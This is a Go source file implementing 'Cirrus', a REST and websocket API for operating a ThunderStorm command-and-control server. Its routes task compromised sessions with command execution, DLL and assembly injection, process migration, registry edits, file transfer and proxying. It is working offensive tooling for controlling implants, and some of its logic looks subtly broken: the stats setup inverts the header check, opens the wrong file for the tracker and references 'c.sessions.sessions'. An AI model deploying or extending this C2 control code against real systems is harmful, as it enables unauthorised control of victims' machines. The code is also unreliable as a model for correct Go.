package cirrus

import (
	"context"
	"crypto/tls"
	"net/http"
	"os"
	"time"

	"github.com/PurpleSec/routex"
	"github.com/gorilla/websocket"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/com"
)

const (
	prefix = `^/api/v1`

	timeout = time.Second * 10
)

// Cirrus is a struct that enables and hosts the ReST API that controls a
// ThunderStorm C2 server able to control clients.
//
// Cirrus also supplies a stats module that can be used to log and track
// event counts.
type Cirrus struct {
	srv   http.Server
	ctx   context.Context
	socks *websocket.Upgrader

	s      *c2.Server
	st     *stats
	ch     chan struct{}
	mux    *routex.Mux
	cancel context.CancelFunc

	jobs      *jobManager
	events    *eventManager
	profiles  *profileManager
	sessions  *sessionManager
	listeners *listenerManager

	Auth    string
	Timeout time.Duration
}

// Close stoppes all Cirrus instances and listening endpoints.
//
// This will NOT close any Sessions or Listeners created.
func (c *Cirrus) Close() error {
	if c.cancel(); c.st != nil {
		<-c.st.ch
	}
	<-c.ch
	return c.srv.Close()
}

// New creates a new Cirrus REST server instance using the supplied C2 Server.
//
// The provided key can be used to authenticate to the Rest service with the
// 'X-CirrusAuth' HTTP header containing the supplied key.
//
// If empty, authentication is disabled.
func New(s *c2.Server, key string) *Cirrus {
	return NewContext(context.Background(), s, key)
}

// Listen will bind to the specified address and begin serving requests.
// This function will return when the server is closed.
func (c *Cirrus) Listen(addr string) error {
	return c.ListenTLS(addr, "", "")
}
func configureRoutes(c *Cirrus, m *routex.Mux) {
	m.Must(prefix+`/events$`, routex.Func(c.websocket), http.MethodGet)
	m.Must(prefix+`/profile$`, routex.Func(c.profiles.httpProfilesGet), http.MethodGet)
	m.Must(prefix+`/profile/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.profiles.httpProfileGet), http.MethodGet)
	m.Must(prefix+`/profile/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.profiles.httpProfilePut), http.MethodPut)
	m.Must(prefix+`/profile/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.profiles.httpProfilePost), http.MethodPost)
	m.Must(prefix+`/profile/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.profiles.httpProfileDelete), http.MethodDelete)
	m.Must(prefix+`/listener$`, routex.Func(c.listeners.httpListenersGet), http.MethodGet)
	m.Must(prefix+`/listener/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.listeners.httpListenerGet), http.MethodGet)
	m.Must(prefix+`/listener/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.listeners.httpListenerDelete), http.MethodDelete)
	m.Must(prefix+`/listener/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Wrap(valListener, routex.WrapFunc(c.listeners.httpListenerPut)), http.MethodPut)
	m.Must(prefix+`/listener/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Wrap(valListener, routex.WrapFunc(c.listeners.httpListenerPost)), http.MethodPost)
	m.Must(prefix+`/session$`, routex.Func(c.sessions.httpSessionsGet), http.MethodGet)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)$`, routex.Func(c.sessions.httpSessionGet), http.MethodGet)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)$`, routex.Func(c.sessions.httpSessionDelete), http.MethodDelete)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/proxy/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Func(c.sessions.httpSessionProxyDelete), http.MethodDelete)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/proxy/(?P<name>[a-zA-Z0-9\-._]+)$`, routex.Wrap(valListener, routex.WrapFunc(c.sessions.sessions.httpSessionProxyPutPost)), http.MethodPut, http.MethodPost)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/job$`, routex.Func(c.jobs.httpJobsGet), http.MethodGet)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/job/(?P<job>[0-9]+)$`, routex.Func(c.jobs.httpJobGetDelete), http.MethodGet, http.MethodDelete)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/job/(?P<job>[0-9]+)/result$`, routex.Func(c.jobs.httpJobResultGetDelete), http.MethodGet, http.MethodDelete)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/sys$`, routex.Marshal(valTaskSystem, taskSystem{}, routex.MarshalFunc(c.sessions.httpTaskSystem)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/sys/spawn$`, routex.Marshal(valTaskSpawn, taskSpawn{}, routex.MarshalFunc(c.sessions.httpTaskSpawn)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/sys/migrate$`, routex.Marshal(valTaskMigrate, taskMigrate{}, routex.MarshalFunc(c.sessions.httpTaskMigrate)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/pull$`, routex.Wrap(valTaskPull, routex.WrapFunc(c.sessions.httpTaskPull)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/io$`, routex.Wrap(valTaskSystemIo, routex.WrapFunc(c.sessions.httpTaskSystemIo)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/upload$`, routex.Wrap(valTaskUpload, routex.WrapFunc(c.sessions.httpTaskUpload)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/profile$`, routex.Wrap(valTaskProfile, routex.WrapFunc(c.sessions.httpTaskProfile)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/regedit$`, routex.Wrap(valTaskRegistry, routex.WrapFunc(c.sessions.httpTaskRegistry)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/download$`, routex.Wrap(valTaskDownload, routex.WrapFunc(c.sessions.httpTaskDownload)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/dll$`, routex.Marshal(valTaskDLL, taskDLL{}, routex.MarshalFunc(c.sessions.httpTaskDLL)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/pexec$`, routex.Marshal(valPullEx, taskPull{}, routex.MarshalFunc(c.sessions.httpTaskPexec)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/asm$`, routex.Marshal(valTaskAssembly, taskPayload{}, routex.MarshalFunc(c.sessions.httpTaskAssembly)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/exec$`, routex.Marshal(valTaskSimple, taskCommand{}, routex.MarshalFunc(c.sessions.httpTaskCommand)), http.MethodPut)
	m.Must(prefix+`/session/(?P<session>[a-zA-Z0-9]+)/zombie$`, routex.Marshal(valTaskZombie, taskZombie{}, routex.MarshalFunc(c.sessions.httpTaskZombie)), http.MethodPut)
}

// Listen is a quick utility function that allows for creation of a new
// Cirrus REST service and will start it immediately.
//
// This function will block until the server is closed.
//
// Quick version of "NewContext(context.Background(), s, key).Listen(addr)".
func Listen(s *c2.Server, key, addr string) error {
	return NewContext(context.Background(), s, key).Listen(addr)
}

// TrackStats will enable the CSV and Tracker files. This function can enable
// Cirrus to log every event (Job/Session/Packet Actions) to a CSV formatted
// file (if not-empty) and a tracking file (if not-empty) that will be updated
// every minute in UNIX fashion (cleared and rewritten) with statistics about
// current Job and Session info.
//
// Returns an error if setting up any of the supplied files fails.
func (c *Cirrus) TrackStats(csv, tracker string) error {
	if len(csv) == 0 && len(tracker) == 0 {
		return nil
	}
	if c.st = new(stats); len(csv) > 0 {
		var (
			_, err = os.Stat(csv)
			h      = err == nil
		)
		if c.st.f, err = os.OpenFile(csv, os.O_APPEND|os.O_CREATE|os.O_WRONLY|os.O_SYNC, 0644); err != nil {
			return err
		}
		if h {
			if _, err = c.st.f.WriteString(header); err != nil {
				return err
			}
		}
	}
	if len(tracker) == 0 {
		return nil
	}
	var err error
	if c.st.t, err = os.OpenFile(csv, os.O_TRUNC|os.O_CREATE|os.O_WRONLY|os.O_SYNC, 0644); err != nil {
		return err
	}
	return nil
}

// ListenTLS will bind to the specified address and use the provided certificate
// and key file paths to listen using a secure TLS tunnel. This function will
// return when the server is closed.
func (c *Cirrus) ListenTLS(addr, cert, key string) error {
	if c.Timeout == 0 {
		c.Timeout = timeout
	}
	c.srv.Addr = addr
	c.srv.ReadTimeout, c.srv.IdleTimeout = c.Timeout, c.Timeout
	c.srv.WriteTimeout, c.srv.ReadHeaderTimeout = c.Timeout, c.Timeout
	go c.jobs.prune(c.ctx)
	go c.events.run(c.ctx)
	if c.st != nil {
		go c.st.track(c.ctx)
	}
	if len(cert) == 0 || len(key) == 0 {
		if err := c.srv.ListenAndServe(); err != http.ErrServerClosed {
			c.Close()
			return err
		}
		return nil
	}
	c.srv.TLSConfig = &tls.Config{
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		CurvePreferences:         []tls.CurveID{tls.CurveP256, tls.X25519},
		PreferServerCipherSuites: true,
	}
	if err := c.srv.ListenAndServeTLS(cert, key); err != http.ErrServerClosed {
		c.Close()
		return err
	}
	return nil
}

// NewContext creates a new Cirrus REST server instance using the supplied C2
// Server instance.
//
// This function allows specifying a Context to aid in cancelation.
func NewContext(x context.Context, s *c2.Server, key string) *Cirrus {
	c := &Cirrus{s: s, Auth: key, Timeout: timeout, ch: make(chan struct{})}
	c.jobs = &jobManager{Cirrus: c, e: make(map[uint64]*c2.Job)}
	c.sessions = &sessionManager{Cirrus: c, e: make(map[string]*session)}
	c.profiles = &profileManager{Cirrus: c, e: make(map[string]cfg.Config)}
	c.listeners = &listenerManager{Cirrus: c, e: make(map[string]*listener)}
	c.events = &eventManager{Cirrus: c, in: make(chan event, 256), new: make(chan *websocket.Conn, 64)}
	c.ctx, c.cancel = context.WithCancel(x)
	c.srv.BaseContext, c.mux = c.context, routex.NewContext(x)
	c.mux.Middleware(encoding)
	c.mux.Middleware(c.auth)
	c.mux.Error = routex.ErrorFunc(writeError)
	c.socks = &websocket.Upgrader{
		CheckOrigin:      func(_ *http.Request) bool { return true },
		ReadBufferSize:   1024,
		WriteBufferSize:  1024,
		HandshakeTimeout: time.Second * 5,
	}
	configureRoutes(c, c.mux)
	if c.srv.Handler = c.mux; s.New != nil {
		f := s.New
		s.New = func(v *c2.Session) {
			f(v)
			c.newSession(v)
		}
	} else {
		s.New = c.newSession
	}
	if s.Oneshot != nil {
		f := s.Oneshot
		s.Oneshot = func(n *com.Packet) {
			f(n)
			//s.cache.catch(n)
		}
	} else {
		s.Oneshot = func(n *com.Packet) {}
	}
	if s.Shutdown != nil {
		f := s.Shutdown
		s.Shutdown = func(v *c2.Session) {
			f(v)
			c.shutdownSession(v)
		}
	} else {
		s.Shutdown = c.shutdownSession
	}
	return c
}

// ListenContext is a quick utility function that allows for creation of a new
// Cirrus REST service and will start it immediately.
//
// This function will block until the server is closed.
//
// Quick version of "NewContext(x, s, l, key).Listen(addr)".
//
// This function allows specifying a Context to aid in cancelation.
func ListenContext(x context.Context, s *c2.Server, key, addr string) error {
	return NewContext(x, s, key).Listen(addr)
}
